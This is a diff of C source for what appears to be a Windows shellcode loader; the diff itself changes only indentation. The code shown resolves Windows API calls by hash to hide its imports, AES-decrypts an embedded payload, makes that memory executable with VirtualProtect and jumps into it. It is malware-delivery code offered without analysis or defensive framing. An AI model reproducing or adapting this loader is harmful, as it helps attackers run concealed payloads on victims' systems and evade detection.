@@ -34,8 +34,8 @@ typedef DWORD(WINAPI* _GetModuleFileName)(HMODULE hModule, LPSTR lpFilename, DWO
 typedef DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
 
 #define CreateFileA_Hash 1470354217
-typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, 
-    DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+                                     DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 
 #define ReadFile_Hash 990362902
 typedef BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
@@ -251,10 +251,10 @@ int entry()
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, sc.aes_key, sc.aes_iv);
     AES_CBC_decrypt_buffer(&ctx, sc.data, sc.len);
-	DWORD oldProtect = 0;
-	if (!VirtualProtect(sc.data, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return 5;
-	((void(*)())sc.data)();
-	Sleep(INFINITE);
+    DWORD oldProtect = 0;
+    if (!VirtualProtect(sc.data, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return 5;
+    ((void(*)())sc.data)();
+    Sleep(INFINITE);
 
     return 0;
 }
